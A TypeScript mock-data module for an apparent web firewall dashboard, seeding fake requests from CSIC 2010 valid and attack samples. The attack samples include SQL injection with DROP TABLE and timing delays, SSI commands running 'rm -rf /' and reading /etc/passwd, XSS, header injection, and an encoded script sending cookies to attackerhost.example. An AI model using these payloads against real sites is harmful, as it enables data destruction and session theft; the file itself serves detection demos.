
export const FAKE_IPS = [
  "192.168.1.1", "10.0.0.12", "172.16.254.1", "45.33.22.11", 
  "88.99.100.12", "201.12.33.44", "92.111.45.6", "12.4.5.6",
  "142.250.190.46", "31.13.71.36", "157.240.22.35", "104.244.42.193",
  "185.60.216.35", "23.235.46.133", "52.84.162.119", "205.251.242.103",
  "1.1.1.1", "8.8.8.8", "212.58.244.70", "13.107.42.12"
];

export const IP_TO_COUNTRY: Record<string, string> = {
  "192.168.1.1": "US", "10.0.0.12": "US", "172.16.254.1": "DE", "45.33.22.11": "UK",
  "88.99.100.12": "RU", "201.12.33.44": "BR", "92.111.45.6": "FR", "12.4.5.6": "CN",
  "142.250.190.46": "US", "31.13.71.36": "IE", "157.240.22.35": "SG", "104.244.42.193": "US",
  "185.60.216.35": "NL", "23.235.46.133": "US", "52.84.162.119": "JP", "205.251.242.103": "US",
  "1.1.1.1": "AU", "8.8.8.8": "US", "212.58.244.70": "UK", "13.107.42.12": "US"
};

// Real CSIC 2010 Parsed Samples (Valid Traffic)
export const CSIC_VALID_SAMPLES = [
  { method: "GET", url: "/tienda1/imagenes/nuestratierra.jpg", payload: "Cookie: JSESSIONID=1DAB65B0324F0B760D56507C0FFCD929", id: "V-7704" },
  { method: "GET", url: "/tienda1/publico/registro.jsp?modo=registro&login=sikander&password=2eSCo63ENti2&dni=19064192K", payload: "Cookie: JSESSIONID=8CD26B5FBF3F555875293CA8CA90F199", id: "V-13515" },
  { method: "GET", url: "/tienda1/miembros/imagenes/zarauz.jpg", payload: "Cookie: JSESSIONID=3BB7D3CFA4883626F142D5A83A97EDC3", id: "V-12445" },
  { method: "GET", url: "/tienda1/publico/autenticar.jsp?modo=entrar&login=chuang&pwd=visionario&remember=on&B1=Entrar", payload: "Cookie: JSESSIONID=29BDC1A4215FA40AC619614130C4A037", id: "V-35896" },
  { method: "GET", url: "/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito", payload: "Cookie: JSESSIONID=E535831273DD8A3D1C0D9932FA59F59C", id: "V-737" },
  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=janna&pwd=eusquero&remember=off&B1=Entrar", id: "V-16025" },
  { method: "POST", url: "/tienda1/publico/caracteristicas.jsp", payload: "id=1", id: "V-10915" },
  { method: "GET", url: "/tienda1/miembros/index.jsp", payload: "Cookie: JSESSIONID=C61FBBEEE45E049ABE4DB9B7E1B47D54", id: "V-7082" },
  { method: "GET", url: "/tienda1/imagenes/logo.gif", payload: "Cookie: JSESSIONID=A53D159B0F23CDF15AF7AF825C939170", id: "V-11591" },
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=dyment&password=Z5R1174oSa&nombre=Sadoc&apellidos=Oruna", id: "V-21484" },
  { method: "POST", url: "/tienda1/publico/anadir.jsp", payload: "id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=98&B1=A%F1adir+al+carrito", id: "V-23259" },
  { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precio=1126&B1=Pasar+por+caja", id: "V-20713" },
  { method: "GET", url: "/tienda1/index.jsp", payload: "Cookie: JSESSIONID=F43C7CD943DE7B1C20D3A9896C463DFB", id: "V-13033" },
  { method: "POST", url: "/tienda1/publico/entrar.jsp", payload: "errorMsg=Credenciales+incorrectas", id: "V-3286" },
  { method: "GET", url: "/tienda1/publico/miembros.jsp", payload: "Cookie: JSESSIONID=2A48D6F851EE859F13A273FF4FF92637", id: "V-5267" },
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=eggebraa&pwd=enALtEceDOr&remember=on&B1=Entrar", id: "V-27977" },
  { method: "GET", url: "/tienda1/global/estilos.css", payload: "Accept: text/css", id: "V-14566" },
  { method: "GET", url: "/tienda1/miembros/salir.jsp", payload: "Cookie: JSESSIONID=7C7D9FAB545CDB214E96AFDE9E202090", id: "V-31314" },
  { method: "GET", url: "/tienda1/imagenes/logo.gif", payload: "Accept: image/gif", id: "V-25883" },
  { method: "GET", url: "/tienda1/global/menum.jsp", payload: "Cookie: JSESSIONID=42CFED5D078524484AA6B1692283DE86", id: "V-2864" },
  { method: "GET", url: "/tienda1/miembros/fotos.jsp", payload: "Cookie: JSESSIONID=4D52613C7A0A8769FEF7E8B93E050D2D", id: "V-22097" },
  { method: "GET", url: "/tienda1/publico/pagar.jsp?modo=insertar&precio=8656&B1=Confirmar", payload: "Cookie: JSESSIONID=6B8FCC0BFBF0378A7A2507C09243692E", id: "V-32160" }
];

// Real CSIC 2010 Parsed Samples (Anomalous/Attack Traffic)
export const CSIC_ANOMALOUS_SAMPLES = [
  // SQL Injection
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=janey&password=3s3%27+AND+%271%27%3D%271&B1=Registrar", attackType: "SQL Injection", score: 0.94, id: "A-21369" },
  { method: "GET", url: "/tienda1/publico/registro.jsp", payload: "email=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--", attackType: "SQL Injection", score: 0.98, id: "A-3620" },
  { method: "GET", url: "/tienda1/publico/pagar.jsp?modo=insertar&precio=1012%27INJECTED_PARAM&B1=Pasar+por+caja", attackType: "SQL Injection", score: 0.96, id: "A-23333" },
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=etoh&password=3Nt783E68r&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25", attackType: "SQL Injection", score: 0.99, id: "A-6934" },
  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=usa9&password=ENjuaGaDiEnTES&cp=AND+1%3D1&B1=Registrar", attackType: "SQL Injection", score: 0.93, id: "A-18468" },
  { method: "GET", url: "/tienda1/publico/registro.jsp", payload: "email=mangini%40cubiertoscbb.an&cp=22314%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--", attackType: "SQL Injection", score: 0.97, id: "A-15419" },
  { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precio=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja", attackType: "SQL Injection", score: 0.98, id: "A-23885" },
  
  // Command Injection
  { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precio=88&B1=Confirmar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E", attackType: "Command Injection", score: 0.97, id: "A-14799" },
  { method: "POST", url: "/tienda1/publico/entrar.jsp", payload: "errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E", attackType: "Command Injection", score: 0.99, id: "A-16272" },
  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=arro&pwd=CarMinAR%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Entrar", attackType: "Command Injection", score: 0.96, id: "A-1174" },
  
  // XSS
  { method: "GET", url: "/tienda1/miembros/editar.jsp?modo=registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E", attackType: "XSS", score: 0.95, id: "A-16089" },
  { method: "GET", url: "/tienda1/publico/pagar.jsp?modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2", attackType: "XSS", score: 0.92, id: "A-12757" },
  { method: "GET", url: "/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F", attackType: "XSS", score: 0.99, id: "A-23991" },
  { method: "POST", url: "/tienda1/publico/registro.jsp", payload: "modo=registro&password=botonesSet-cookie%253A%2BTamper%253D1041264011025374727&B1=Registrar", attackType: "XSS", score: 0.94, id: "A-13852" },
  
  // Path Traversal / Exposure
  { method: "GET", url: "/tienda1/4861362529278789730.java", payload: "Source File Exposure Attempt", attackType: "Path Traversal", score: 0.91, id: "A-12371" },
  { method: "GET", url: "/tienda1/global/asf-logo-wide.gif.bak", payload: "Backup File Access Attempt", attackType: "Path Traversal", score: 0.93, id: "A-20884" },
  { method: "GET", url: "/tienda1/.INC", payload: "Include File Disclosure", attackType: "Path Traversal", score: 0.96, id: "A-1488" },
  { method: "GET", url: "/tienda1/publico/caracteristicas.jsp?idA=2", payload: "Parameter Manipulation detected (id -> idA)", attackType: "Path Traversal", score: 0.85, id: "A-11044" },
  { method: "GET", url: "/_vti_cnf/", payload: "FrontPage Server Extensions Metadata Leak", attackType: "Path Traversal", score: 0.95, id: "A-23327" },
  { method: "GET", url: "/tienda1.Bak", payload: "Backup Directory Probe", attackType: "Path Traversal", score: 0.92, id: "A-8215" },
  
  // Header / Cookie Tampering
  { method: "GET", url: "/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235", attackType: "XSS", score: 0.94, id: "A-1446" },
  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=ardoin&pwd=antroponimi6any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Entrar", attackType: "XSS", score: 0.96, id: "A-19086" }
];

export function getRandomElement<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

export function generateFakeRequest(timestampOverride?: string) {
  const roll = Math.random();
  let decision: 'SAFE' | 'BLOCKED' | 'SUSPICIOUS' = 'SAFE';
  let sample;
  
  if (roll > 0.80) {
    decision = 'BLOCKED';
    sample = getRandomElement(CSIC_ANOMALOUS_SAMPLES);
  } else if (roll > 0.70) {
    decision = 'SUSPICIOUS';
    const validBase = getRandomElement(CSIC_VALID_SAMPLES);
    sample = { ...validBase, attackType: 'Suspicious Anomaly', score: 0.65, payload: "Malformed Context: " + validBase.payload };
  } else {
    decision = 'SAFE';
    const validBase = getRandomElement(CSIC_VALID_SAMPLES);
    sample = { ...validBase, attackType: 'Safe', score: 0.05, payload: validBase.payload };
  }

  const ip = getRandomElement(FAKE_IPS);
  
  // CRYPTOGRAPHIC ENTROPY SUFFIX: Ensures absolute React key uniqueness across session
  const uniqueId = `${sample.id}-${Math.random().toString(36).substring(2, 10)}-${Date.now() % 100000}`;

  return {
    id: uniqueId,
    timestamp: timestampOverride || new Date().toISOString(),
    ip: ip,
    country: IP_TO_COUNTRY[ip] || "US",
    endpoint: sample.url,
    method: sample.method,
    attackType: (sample as any).attackType || 'Safe',
    score: (sample as any).score || 0.05,
    decision: decision,
    inferenceTime: Math.floor(Math.random() * 8) + 2,
    payload: sample.payload || "Dataset Context: CSIC-2010"
  };
}

export function getSeededData() {
  const data = [];
  const now = Date.now();
  const oneDay = 24 * 60 * 60 * 1000;
  
  for (let i = 0; i < 200; i++) {
    const timestamp = new Date(now - Math.random() * oneDay).toISOString();
    data.push(generateFakeRequest(timestamp));
  }
  
  return data.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}
